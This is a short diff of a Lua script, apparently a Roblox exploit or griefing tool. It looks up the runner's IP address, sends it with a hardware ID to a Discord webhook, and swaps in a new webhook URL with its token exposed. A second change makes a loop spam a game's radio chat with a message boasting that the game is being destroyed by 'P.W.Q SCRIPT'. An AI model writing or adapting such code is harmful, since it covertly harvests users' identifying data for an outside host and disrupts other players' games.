@@ -39,7 +39,7 @@ end
 local IP = game:HttpGet("https://v4.ident.me")
 if hwid then
     local HttpServ = game:GetService('HttpService')
-    local url = "https://discord.com/api/webhooks/1332217245593632788/3pcbMtN6xfCkC-OuXjdqAK_wmLMEcpvxFdT0IsR_zusk4LVGSXF_HA2XZS7Sqjn22dRY"
+    local url = "https://discord.com/api/webhooks/1357669953062309958/w4iGeMavOLyXzlL18OhsiMMeNxwjhWh4gBREY9AN37yiM5m08DVizkxnEM7Dzz8azaMw"
 
     local data =
     {
@@ -542,7 +542,7 @@ G2L["19"].Activated:Connect(function()
                 local radio = workspace:FindFirstChild(selectedRadio)
                 if radio then
                     for i = 1, count do
-                        radio.chat:FireServer("Anonim: " .. message)
+                        radio.chat:FireServer("YOUR GAME IS BEING DESTROYED BY P.W.Q SCRIPT || VRP SCRIPT VERSION 2.1. GLORY TO P.W.Q!: " .. message)
                     end
                 else
                     warn("Radio not found: " .. selectedRadio)
